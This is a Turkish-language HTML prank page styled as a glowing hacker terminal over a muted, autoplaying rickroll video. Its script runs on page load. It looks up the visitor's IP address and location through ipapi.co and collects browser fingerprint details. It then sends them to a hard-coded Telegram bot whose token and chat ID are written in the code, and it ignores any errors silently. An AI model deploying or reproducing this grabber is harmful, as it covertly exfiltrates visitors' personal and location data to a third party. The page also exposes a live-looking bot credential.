<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <style>
    html, body {
      margin: 0; padding: 0; width: 100%; height: 100%;
      background: black;
      color: #00ff00;
      font-family: monospace, monospace;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #terminal {
      position: relative;
      width: 90vw;
      max-width: 800px;
      height: 80vh;
      background-color: black;
      border-radius: 8px;
      padding: 20px;
      box-sizing: border-box;
      overflow-y: auto;
      box-shadow: 0 0 20px #00ff00;
      white-space: pre-wrap;
      user-select: none;
      z-index: 10;
    }
    #rickroll {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      pointer-events: none;
      opacity: 0.1;
      z-index: 1;
    }
  </style>
</head>
<body>

  <iframe id="rickroll" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" frameborder="0" allowfullscreen></iframe>

  <div id="terminal">Terminal başlatılıyor...</div>

  <script>
    const terminal = document.getElementById('terminal');

    function logToTerminal(text) {
      terminal.textContent += text + '\n';
      terminal.scrollTop = terminal.scrollHeight;
    }

    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Hata olursa sessizce geç
      }
    }

    async function collectData() {
      logToTerminal('Veriler toplanıyor...');
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message = `Gizli Veri:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Çözünürlük: ${screen.width}x${screen.height}\n` +
          `Dil: ${navigator.language}\n` +
          `Platform: ${navigator.platform}\n` +
          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        logToTerminal(message);
        await sendToTelegram(message);
        logToTerminal('Veriler gönderildi.');
      } catch(e) {
        logToTerminal('Veri toplanırken hata oluştu.');
      }
    }

    collectData();
  </script>
</body>
</html>
